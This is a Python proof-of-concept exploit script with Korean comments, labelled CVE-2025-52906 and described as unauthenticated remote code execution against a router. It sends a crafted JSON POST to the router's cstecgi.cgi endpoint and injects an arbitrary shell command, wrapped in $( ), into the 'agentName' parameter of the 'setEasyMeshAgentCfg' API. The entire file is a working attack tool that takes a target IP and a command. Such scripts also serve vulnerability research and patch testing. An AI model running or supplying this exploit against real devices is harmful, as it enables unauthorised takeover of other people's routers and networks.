#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_ENDPOINT = "/cgi-bin/cstecgi.cgi"

def exploit_unauthenticated(target_ip, command):
    """
    인증 없이 RCE를 시도하는 메인 공격 함수 (setEasyMeshAgentCfg 대상)
    """
    target_url = f"http://{target_ip}{API_ENDPOINT}"
    
    payload = f"$({command})"
    
    data = {
        "topicurl": "setEasyMeshAgentCfg",  # RCE가 가능한 API
        "agentName": payload,                # 셸 명령어가 삽입되는 취약 파라미터
        "opmode": "0",
        "meshStart": "1"
    }
    
    print(f"[*] 1. 인증 우회 RCE 시도: {target_ip}")
    print(f"[*] 2. 주입할 페이로드 (agentName): {payload}")
    
    try:
        response = requests.post(target_url,
                               json=data,
                               verify=False,
                               timeout=10,
                               headers={"Content-Type": "application/json;charset=UTF-8"})
        
        print(f"[*] 3. 서버 응답 코드: {response.status_code}")
        
        if response.status_code == 200:
            print("[+] RCE 공격 요청 전송 완료.")
            print("[*] 4. 라우터에 접속하여 명령 실행 결과를 확인하십시오.")
        else:
            print(f"[-] 요청 실패. HTTP 상태 코드: {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] 네트워크 에러 발생: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-52906 PoC - Unauthenticated RCE")
    parser.add_argument("target_ip", help="타겟 라우터의 IP 주소")
    parser.add_argument("command", default="id", help="라우터에서 실행할 셸 명령어 (예: id, hostname)")
    args = parser.parse_args()
    
    exploit_unauthenticated(args.target_ip, args.command)